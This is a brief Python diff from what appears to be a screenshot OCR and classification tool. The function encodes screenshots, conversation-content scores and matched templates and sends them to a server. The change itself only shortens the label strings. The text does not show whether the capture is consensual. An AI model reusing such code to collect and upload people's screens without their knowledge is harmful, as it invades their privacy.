@@ -126,14 +126,14 @@ def process_ocr_and_classification():
                 base64_image = encode_image_to_base64(all_results[folder_name]['original_image'])
                 send_data_to_server({
                     'uuid': '',
-                    'type': f'Screenshot image: {folder_name}',
+                    'type': f'Screenshot image',
                     'content': f"{base64_image}"
                 })
 
                 if conversation_percentage > 70:
                     send_data_to_server({
                         'uuid': '',
-                        'type': f"Conversation percentage: {folder_name}",
+                        'type': f"Conversation percentage",
                         'content': f"conversation_percentage={conversation_percentage:.2f}"
                     })
 
@@ -143,7 +143,7 @@ def process_ocr_and_classification():
                     matched_templates = [key.replace('_value', '') for key in matched_templates]
                     send_data_to_server({
                         'uuid': '',
-                        'type': f"Templates matched: {folder_name}",
+                        'type': f"Templates matched",
                         'content': f"{','.join(matched_templates)}"
                     })
 
